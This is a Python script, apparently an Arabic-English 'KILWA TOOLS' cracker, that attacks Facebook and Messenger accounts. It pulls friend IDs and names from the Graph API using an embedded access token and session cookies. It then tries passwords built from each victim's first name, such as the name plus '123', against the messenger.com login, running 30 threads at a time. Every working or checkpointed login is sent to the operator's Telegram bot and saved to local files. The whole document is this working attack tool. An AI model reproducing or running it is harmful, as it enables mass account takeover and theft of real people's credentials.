import os
try:
	import requests,telebot,user_agent,sys,re,urllib,webbrowser
	from user_agent import generate_user_agent
except ModuleNotFoundError as x:
	m = str(x).split("'")[1]
	os.system(f'pip install {m}')
from concurrent.futures import ThreadPoolExecutor as kil

Id,token = input('\033[2;36m- Enter ID Telegram ~ ادخل ايديك تلجرام : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ ادخل توكن البوت : \033[1;97m')
kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل الاداة '))
webbrowser.open('')
if kopo.status_code == 404:
	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
bot = telebot.TeleBot(token,parse_mode='HTML')
	
os.system('clear')
def Menu():
	print('''\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       - Menu • القائمة -
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[2;32m[ 1 ] - Crack From ID ~ صيد من ايديات
[ 2 ] - Crack From File ~ صيد من ملف
\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   - Programmer • المبرمج ~ @Lx0b2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
	c = input('   - Choose ~ اختار : ')
	if c == '1':
		os.system('clear')
		IDS()
	elif c == '2':
		os.system('clear')
		File()
		
cid,fid=[],[]
z,total,ok,cp=0,0,0,0

def get(user):
	try:
		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=VqnyZnssqsKBKbgESlZ_taLG; sb=VqnyZpfwktei3fZkOk0sEFeH; m_pixel_ratio=2.75; wd=377x640; c_user=100090482843712; fr=0b0KoK4pThQiTR8mL.AWWeigM0vY7FfxFoRHb45ibCfwA.Bm8qlW..AAA.0.0.Bm8qmY.AWWN7S50aL8; xs=7%3Ah05w7mywPWPRuw%3A2%3A1727179162%3A-1%3A14619; locale=ar_AR; fbl_st=101223390%3BT%3A28786319; vpd=v1%3B640x377x2.75'}).json()
		for mm in url['friends']['data']:
			ko = (mm['id']+'|'+mm['name'])
			if ko in fid:
				pass
			else:
				fid.append(ko)
	except:
		print('- Error ~ خطأ في الايدي ⛔'+user)
		
def IDS():
	global z
	how = input('- How Many IDs ~ كم ايدي ؟ : ')
	for n in range(int(how)):
		z+=1
		k = input(f'- Enter ID • {z} ادخل الايدي : ')
		cid.append(k)
	for kil in cid:
		get(kil)
	print(f'- Done Extract ~ تم استخراج : {len(fid)} ايدي')
	os.system('clear')
	password()
	
def File():
	try:
		name = input('• File Name • اسم او مسار الملف : ')
		for line in open(name, 'r').readlines():
			fid.append(line.strip())
		print('- Total id • الايديات : '+str(len(fid)))
		os.system('clear')
		password()
	except:
		print('- EROR ⛔')
	
def password():
	with kil(max_workers=30) as kp:
		for kk in fid:
			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'1234',frs+'123456789',frs+'1234567890',frs+'1122334455']
			kp.submit(checker,idf,pwv)

def checker(idf,pwv):
	global total,ok,cp
	print('\r\033[2;36mϟ \033[1;97m[\033[2;36mKILWA\033[1;97m-\033[2;36mTOOLS\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
	for ps in pwv:
		open('tt.txt','a').write(idf+'|'+ps+'\n')
		try:
			r = requests.session()
			headers = {
			 'Authority':'www.messenger.com',
			 'Pragma':'no-cache',
			 'Cache-Control':'no-cache',
			 'Sec-Ch-Ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
			 'Sec-Ch-Ua-Mobile':'?0',
			 'Sec-Ch-Ua-Platform':'Linux',
			 'Origin':'https://www.messenger.com',
			 'Upgrade-Insecure-Requests':'1',
			 'Dnt':'1',
			 'Content-Type':'application/x-www-form-urlencoded',
			 'User-Agent': generate_user_agent(),
			 'Accept':'text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.9',
			 'Sec-Fetch-Site':'same-origin',
			 'Sec-Fetch-Mode':'navigate',
			 'Sec-Fetch-User':'?1',
			 'Sec-Fetch-Dest':'document',
			 'Referer':'https://www.messenger.com/',
			 'Accept-Language':'en-US, en;q=0.9',
		 }
			request = r.get('https://www.messenger.com/').text
			js_datr = re.search('"_js_datr","(.*?)"',str(request)).group(1)
			payload = {
			 'jazoest':re.search('name="jazoest" value="(.*?)"', str(request)).group(1),
			 'lsd':re.search('name="lsd" value="(.*?)"', str(request)).group(1),
			 'initial_request_id':re.search('name="initial_request_id" value="(.*?)"', str(request)).group(1),
			 'timezone':'-420',
			 'lgndim':re.search('name="lgndim" value="(.*?)"', str(request)).group(1),
			 'lgnrnd':re.search('name="lgnrnd" value="(.*?)"', str(request)).group(1),
			 'lgnjs':'n',
			 'email': idf,
			 'pass': ps,
			 'login':'1',
			 'persistent':'1',
			 'default_persistent':''
		 }
			headers.update({'Content-Length': str(len(payload)),'Cookie':'wd=1010x980; dpr=2; datr=%s'%(js_datr)})
			signature = urllib.parse.urlencode(payload,doseq=True)
			response  = r.post('https://www.messenger.com/login/password/', data=signature, headers=headers)
		
			if 'checkpoint' in response.url:
				cp+=1
				stc = f'''<strong>ϟ Secure Acc ~ حساب سكيور  
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Email -> <code>{idf}</code>
ϟ Pass -> <code>{ps}</code>
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Programmer • @Lx0b2 🔥</strong>'''
				stp = f'''\033[1;31mϟ Secure Acc ~ حساب سكيور  
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Email -> {idf}
ϟ Pass -> {ps}
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Programmer • @Lx0b2 🔥'''
				bot.send_message(Id,stc)
				print(stp+'\n')
				open('CPKilwa.txt','a').write(stc+'\n')
			elif 'c_user' in r.cookies.get_dict():
				ok+=1
				okc = f'''<strong>ϟ Good Acc ~ حساب صحيح ✅
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Email -> <code>{idf}</code>
ϟ Pass -> <code>{ps}</code>
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Programmer • @Lx0b2 🔥</strong>'''
				okp = f'''\033[2;32mϟ Good Acc ~ حساب صحيح ✅
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Email -> {idf}
ϟ Pass -> {ps}
~•~•~•~•~•~•~•~•~•~•~•~
ϟ Programmer • @Lx0b2 🔥'''
				bot.send_message(Id,okc)
				print(okp+'\n')
				open('OKKilwa.txt','a').write(okc+'\n')
			else:
				continue
				
		except:
			continue
	total+=1
	
Menu()
